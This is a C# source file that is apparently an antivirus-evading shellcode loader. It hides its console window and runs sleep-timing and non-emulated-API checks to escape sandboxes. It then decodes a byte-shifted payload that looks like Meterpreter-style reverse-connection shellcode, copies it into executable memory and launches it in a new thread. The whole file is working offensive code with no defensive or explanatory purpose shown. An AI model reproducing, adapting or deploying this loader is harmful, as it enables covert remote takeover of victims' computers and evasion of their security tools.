using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace Met
{
    class Program
    {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();    

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    const int SW_HIDE = 0;
    const int SW_SHOW = 5;



    static void Main(string[] args)

  
        {


            var handle = GetConsoleWindow();

            ShowWindow(handle, SW_HIDE);


            //Sleep timer bypass
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5) {
                return;
            }
            Console.WriteLine("Sleep timer bypassed!");

            //Non emulated api's
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null) {
                return;

            }

            Console.WriteLine("Emulation done!");
            byte[] buf = new byte[796] {0xfe, 0x4a, 0x85, 0xe6, 0xf2, 0xea, 0xce, 0x02, 0x02, 0x02, 0x43, 0x53, 0x43, 0x52, 0x54, 0x53, 0x58, 0x4a, 0x33, 0xd4, 0x67, 0x4a, 0x8d, 0x54, 0x62, 0x4a, 0x8d, 0x54, 0x1a, 0x4a, 0x8d, 0x54, 0x22, 0x4a, 0x11, 0xb9, 0x4c, 0x4c, 0x4f, 0x33, 0xcb, 0x4a, 0x8d, 0x74, 0x52, 0x4a, 0x33, 0xc2, 0xae, 0x3e, 0x63, 0x7e, 0x04, 0x2e, 0x22, 0x43, 0xc3, 0xcb, 0x0f, 0x43, 0x03, 0xc3, 0xe4, 0xef, 0x54, 0x4a, 0x8d, 0x54, 0x22, 0x43, 0x53, 0x8d, 0x44, 0x3e, 0x4a, 0x03, 0xd2, 0x68, 0x83, 0x7a, 0x1a, 0x0d, 0x04, 0x11, 0x87, 0x74, 0x02, 0x02, 0x02, 0x8d, 0x82, 0x8a, 0x02, 0x02, 0x02, 0x4a, 0x87, 0xc2, 0x76, 0x69, 0x4a, 0x03, 0xd2, 0x8d, 0x4a, 0x1a, 0x46, 0x8d, 0x42, 0x22, 0x4b, 0x03, 0xd2, 0x52, 0xe5, 0x58, 0x4a, 0x01, 0xcb, 0x4f, 0x33, 0xcb, 0x43, 0x8d, 0x36, 0x8a, 0x4a, 0x03, 0xd8, 0x4a, 0x33, 0xc2, 0x43, 0xc3, 0xcb, 0x0f, 0xae, 0x43, 0x03, 0xc3, 0x3a, 0xe2, 0x77, 0xf3, 0x4e, 0x05, 0x4e, 0x26, 0x0a, 0x47, 0x3b, 0xd3, 0x77, 0xda, 0x5a, 0x46, 0x8d, 0x42, 0x26, 0x4b, 0x03, 0xd2, 0x68, 0x43, 0x8d, 0x0e, 0x4a, 0x46, 0x8d, 0x42, 0x1e, 0x4b, 0x03, 0xd2, 0x43, 0x8d, 0x06, 0x8a, 0x43, 0x5a, 0x4a, 0x03, 0xd2, 0x43, 0x5a, 0x60, 0x5b, 0x5c, 0x43, 0x5a, 0x43, 0x5b, 0x43, 0x5c, 0x4a, 0x85, 0xee, 0x22, 0x43, 0x54, 0x01, 0xe2, 0x5a, 0x43, 0x5b, 0x5c, 0x4a, 0x8d, 0x14, 0xeb, 0x4d, 0x01, 0x01, 0x01, 0x5f, 0x4a, 0x33, 0xdd, 0x55, 0x4b, 0xc0, 0x79, 0x6b, 0x70, 0x6b, 0x70, 0x67, 0x76, 0x02, 0x43, 0x58, 0x4a, 0x8b, 0xe3, 0x4b, 0xc9, 0xc4, 0x4e, 0x79, 0x28, 0x09, 0x01, 0xd7, 0x55, 0x55, 0x4a, 0x8b, 0xe3, 0x55, 0x5c, 0x4f, 0x33, 0xc2, 0x4f, 0x33, 0xcb, 0x55, 0x55, 0x4b, 0xbc, 0x3c, 0x58, 0x7b, 0xa9, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0xea, 0x0d, 0x02, 0x02, 0x02, 0x70, 0x7b, 0x6f, 0x75, 0x67, 0x65, 0x30, 0x65, 0x71, 0x6f, 0x02, 0x5c, 0x4a, 0x8b, 0xc3, 0x4b, 0xc9, 0xc2, 0xbd, 0x03, 0x02, 0x02, 0x4f, 0x33, 0xcb, 0x55, 0x55, 0x6c, 0x05, 0x55, 0x4b, 0xbc, 0x59, 0x8b, 0xa1, 0xc8, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0xea, 0xf8, 0x02, 0x02, 0x02, 0x31, 0x75, 0x77, 0x74, 0x78, 0x67, 0x7b, 0x31, 0x32, 0x4e, 0x57, 0x53, 0x32, 0x49, 0x33, 0x69, 0x34, 0x7c, 0x70, 0x36, 0x55, 0x52, 0x6e, 0x4d, 0x6f, 0x7a, 0x33, 0x7a, 0x6f, 0x79, 0x4d, 0x61, 0x39, 0x3b, 0x37, 0x70, 0x35, 0x52, 0x4e, 0x7c, 0x7b, 0x4f, 0x45, 0x74, 0x7a, 0x6e, 0x5a, 0x4d, 0x67, 0x4d, 0x61, 0x4d, 0x65, 0x67, 0x61, 0x76, 0x5b, 0x5a, 0x74, 0x48, 0x4d, 0x3b, 0x57, 0x69, 0x77, 0x7b, 0x3b, 0x78, 0x50, 0x54, 0x61, 0x77, 0x36, 0x4a, 0x36, 0x73, 0x70, 0x49, 0x44, 0x38, 0x63, 0x57, 0x36, 0x6f, 0x59, 0x54, 0x6c, 0x37, 0x6e, 0x54, 0x52, 0x7b, 0x3a, 0x4a, 0x6b, 0x39, 0x69, 0x47, 0x3b, 0x44, 0x59, 0x3b, 0x43, 0x69, 0x51, 0x3a, 0x77, 0x45, 0x6f, 0x38, 0x43, 0x6d, 0x77, 0x64, 0x64, 0x64, 0x34, 0x53, 0x35, 0x63, 0x34, 0x63, 0x6b, 0x4d, 0x33, 0x57, 0x57, 0x65, 0x77, 0x35, 0x54, 0x76, 0x4c, 0x64, 0x6e, 0x4f, 0x7a, 0x58, 0x54, 0x4a, 0x3b, 0x7c, 0x38, 0x77, 0x6a, 0x47, 0x76, 0x57, 0x55, 0x3b, 0x72, 0x52, 0x61, 0x78, 0x71, 0x3a, 0x4b, 0x38, 0x38, 0x2f, 0x46, 0x72, 0x75, 0x59, 0x4d, 0x6a, 0x4c, 0x71, 0x51, 0x4a, 0x37, 0x64, 0x65, 0x4d, 0x52, 0x4c, 0x49, 0x37, 0x73, 0x76, 0x58, 0x6a, 0x6b, 0x46, 0x61, 0x7a, 0x6e, 0x52, 0x4c, 0x56, 0x74, 0x6e, 0x68, 0x74, 0x48, 0x7a, 0x63, 0x37, 0x4a, 0x6f, 0x66, 0x3a, 0x32, 0x73, 0x7c, 0x3a, 0x52, 0x54, 0x6a, 0x47, 0x61, 0x73, 0x4e, 0x39, 0x59, 0x6e, 0x69, 0x72, 0x54, 0x48, 0x5a, 0x4f, 0x71, 0x6c, 0x4a, 0x44, 0x64, 0x4e, 0x69, 0x4e, 0x78, 0x56, 0x70, 0x77, 0x6d, 0x6f, 0x56, 0x6a, 0x54, 0x38, 0x7a, 0x6a, 0x33, 0x6a, 0x61, 0x02, 0x4a, 0x8b, 0xc3, 0x55, 0x5c, 0x43, 0x5a, 0x4f, 0x33, 0xcb, 0x55, 0x4a, 0xba, 0x02, 0x34, 0xaa, 0x86, 0x02, 0x02, 0x02, 0x02, 0x52, 0x55, 0x55, 0x4b, 0xc9, 0xc4, 0xed, 0x57, 0x30, 0x3d, 0x01, 0xd7, 0x4a, 0x8b, 0xc8, 0x6c, 0x0c, 0x61, 0x4a, 0x8b, 0xf3, 0x6c, 0x21, 0x5c, 0x54, 0x6a, 0x82, 0x35, 0x02, 0x02, 0x4b, 0x8b, 0xe2, 0x6c, 0x06, 0x43, 0x5b, 0x4b, 0xbc, 0x77, 0x48, 0xa0, 0x88, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4f, 0x33, 0xc2, 0x55, 0x5c, 0x4a, 0x8b, 0xf3, 0x4f, 0x33, 0xcb, 0x4f, 0x33, 0xcb, 0x55, 0x55, 0x4b, 0xc9, 0xc4, 0x2f, 0x08, 0x1a, 0x7d, 0x01, 0xd7, 0x87, 0xc2, 0x77, 0x21, 0x4a, 0xc9, 0xc3, 0x8a, 0x15, 0x02, 0x02, 0x4b, 0xbc, 0x46, 0xf2, 0x37, 0xe2, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4a, 0x01, 0xd1, 0x76, 0x04, 0xed, 0xac, 0xea, 0x57, 0x02, 0x02, 0x02, 0x55, 0x5b, 0x6c, 0x42, 0x5c, 0x4b, 0x8b, 0xd3, 0xc3, 0xe4, 0x12, 0x4b, 0xc9, 0xc2, 0x02, 0x12, 0x02, 0x02, 0x4b, 0xbc, 0x5a, 0xa6, 0x55, 0xe7, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4a, 0x95, 0x55, 0x55, 0x4a, 0x8b, 0xe9, 0x4a, 0x8b, 0xf3, 0x4a, 0x8b, 0xdc, 0x4b, 0xc9, 0xc2, 0x02, 0x22, 0x02, 0x02, 0x4b, 0x8b, 0xfb, 0x4b, 0xbc, 0x14, 0x98, 0x8b, 0xe4, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4a, 0x85, 0xc6, 0x22, 0x87, 0xc2, 0x76, 0xb4, 0x68, 0x8d, 0x09, 0x4a, 0x03, 0xc5, 0x87, 0xc2, 0x77, 0xd4, 0x5a, 0xc5, 0x5a, 0x6c, 0x02, 0x5b, 0x4b, 0xc9, 0xc4, 0xf2, 0xb7, 0xa4, 0x58, 0x01, 0xd7};
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            
            {
            encoded[i] = (byte)(((uint)buf[i] - 2) & 0xff);
            }

            buf = encoded;
            Console.WriteLine("Cipher decrypted!");
            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Console.WriteLine("Allocation Complete!");
            Marshal.Copy(buf, 0, addr, size);
            Console.WriteLine("Copy done!");
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            Console.WriteLine("Thread Created");
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            


            

           
    }
    
}}